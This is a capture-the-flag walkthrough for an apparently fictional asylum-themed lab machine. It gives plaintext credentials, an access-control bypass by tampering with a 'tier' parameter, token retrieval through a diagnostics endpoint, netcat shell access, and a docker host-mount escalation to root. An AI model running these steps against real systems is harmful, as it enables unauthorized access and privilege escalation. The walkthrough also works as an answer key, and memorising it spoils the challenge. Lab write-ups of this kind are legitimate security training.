# OSINT
After a full nmap scan, we find a "fakebook" page on port 8000, with a few comments and stuff.

CREDS FOR 8080
```
guard.hopkins@hopsecasylum.com:Johnnyboy1982!
```

We get flag1 once the "cells/storage" room is unlocked


# Flag 2

Log into the guard console on port 13400.

Here, we find a certain "admin only" record.

To view this record, we use our proxy to capture a request to
```
POST /v1/streams/request
HOST: <M_IP>:13401
Content-Type: application/json
```
Modify to something like
```
POST /v1/streams/request?tier=admin
HOST: <M_IP>:13401
Content-Type: application/json

{"camera_id":"cam-admin","tier":"guard"}
```
A ticket_id should be returned, which we use to download the admin record unto our machine from
```
<M_IP>:13401/v1/streams/<TCKT_ID>/seg/playlist000.ts?r=0

Code: 115879
```
Also make a request to
```

<M_IP>:13401/v1/streams/<TCKT_ID>/manifest.m3u8
```

In the response body, we find
```
/v1/ingest/jobs
/v1/ingest/diagnostics
rtsp://vendor-cam.test/cam-admin
```
With this, send a POST request to
```
POST /v1/ingest/diagnostics HTTP/1.1
Host: <M_IP>:13401
Content-Type: application/json

{"rtsp_url":"rtsp://vendor-cam.test/cam-admin"}
```
The response body should contain a job_id & status, which we use to get a token.

This token helps us establish a link unto the machine through netcat.
```
nc <M_IP> 13404 
<SUBMIT TOKEN AFTERWARD>
```
Rest of flag 2 at 
```
/home/svc_vidops/user_part2.txt
```


# Getting flag 3
Using
```
find / -perm -04000 -type f -ls 2>/dev/null
```
returns
```
dockermgr dockermgr /usr/local/bin/diag_shell

```

A docker process, which we can use to gain root on the machine with
```
sg docker -c "docker images" #<-- to see what images exist
sg docker -c "docker run --user root -v /:/host --rm -it <image-name> /bin/bash" #<-- gives us root access
```

While as root in the docker instance, run
```
cat scada_terminal | grep "CODE"
``
which provides us with the unlock code for the main corridor.

we should get flag 3 once the main corridor opens up

